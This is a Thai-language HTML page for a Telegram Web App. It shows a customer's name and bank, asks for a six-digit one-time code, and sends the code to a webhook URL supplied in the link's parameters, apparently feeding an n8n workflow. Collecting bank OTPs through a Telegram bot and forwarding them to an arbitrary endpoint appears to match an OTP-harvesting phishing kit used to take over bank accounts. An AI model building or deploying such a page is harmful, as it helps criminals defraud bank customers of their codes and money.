<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>OTP Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body class="bg-gray-50 p-4 font-sans antialiased text-gray-900">
    <div id="app" class="max-w-md mx-auto bg-white p-6 rounded-2xl shadow-sm border border-gray-100">
        <div class="text-center mb-6">
            <h1 class="text-xl font-bold text-gray-800">ยืนยันตัวตน OTP</h1>
            <p class="text-sm text-gray-500 mt-1">กรุณากรอกรหัส 6 หลักเพื่อทำรายการ</p>
        </div>

        <!-- Section แสดงข้อมูลผู้ใช้ที่ส่งมาจาก n8n -->
        <div class="mb-6 p-4 bg-blue-50 rounded-xl">
            <div class="flex justify-between mb-1">
                <span class="text-xs text-blue-600 uppercase font-semibold">ชื่อลูกค้า</span>
                <span id="name" class="text-sm font-bold text-blue-900">-</span>
            </div>
            <div class="flex justify-between">
                <span class="text-xs text-blue-600 uppercase font-semibold">ธนาคาร</span>
                <span id="bank" class="text-sm font-bold text-blue-900">-</span>
            </div>
        </div>

        <form id="otpForm" class="space-y-6">
            <div>
                <input 
                    type="text" 
                    id="otpInput" 
                    inputmode="numeric" 
                    maxlength="6" 
                    placeholder="000000"
                    class="w-full text-center text-4xl font-mono tracking-[0.5em] py-4 border-2 border-gray-100 rounded-xl focus:border-blue-500 focus:ring-0 transition-all outline-none"
                    required
                >
            </div>

            <button 
                type="submit" 
                id="submitBtn"
                class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold text-lg hover:bg-blue-700 active:scale-[0.98] transition-all shadow-lg shadow-blue-200"
            >
                ยืนยันรหัส
            </button>
        </form>

        <p id="status" class="mt-4 text-center text-sm font-medium hidden"></p>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        // ดึงจาก startapp parameter (เปิดผ่าน t.me/BOT/APP?startapp=...)
        // และ fallback ไปที่ URL query string (กรณีเปิดผ่าน browser ปกติ)
        let params;
        const rawParam = tg.initDataUnsafe?.start_param || '';

        if (rawParam) {
            params = new URLSearchParams(decodeURIComponent(rawParam));
        } else {
            params = new URLSearchParams(window.location.search);
        }

        document.getElementById('name').textContent = params.get('name') || 'ไม่ระบุ';
        document.getElementById('bank').textContent = params.get('bank') || 'ไม่ระบุ';

        const webhookUrl = params.get('webhook');
        const userId = params.get('id');
        const threadId = params.get('thread');

        const form = document.getElementById('otpForm');
        const status = document.getElementById('status');

        form.onsubmit = async (e) => {
            e.preventDefault();
            const otp = document.getElementById('otpInput').value;
            const btn = document.getElementById('submitBtn');

            if (otp.length !== 6) return alert('กรุณากรอกรหัสให้ครบ 6 หลัก');

            btn.disabled = true;
            btn.innerHTML = 'กำลังตรวจสอบ...';

            try {
                // ส่งข้อมูลกลับไปหา n8n ทาง Webhook
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        id: userId,
                        thread_id: threadId,
                        otp: otp
                    })
                });

                if (response.ok) {
                    status.textContent = '✅ ส่งข้อมูลสำเร็จ! กำลังปิดหน้าต่าง...';
                    status.className = 'mt-4 text-center text-sm font-medium text-green-600';
                    status.classList.remove('hidden');
                    setTimeout(() => tg.close(), 1500);
                } else {
                    throw new Error();
                }
            } catch (err) {
                btn.disabled = false;
                btn.innerHTML = 'ลองใหม่อีกครั้ง';
                status.textContent = '❌ เกิดข้อผิดพลาด กรุณาลองใหม่';
                status.className = 'mt-4 text-center text-sm font-medium text-red-600';
                status.classList.remove('hidden');
            }
        };
    </script>
</body>
</html>
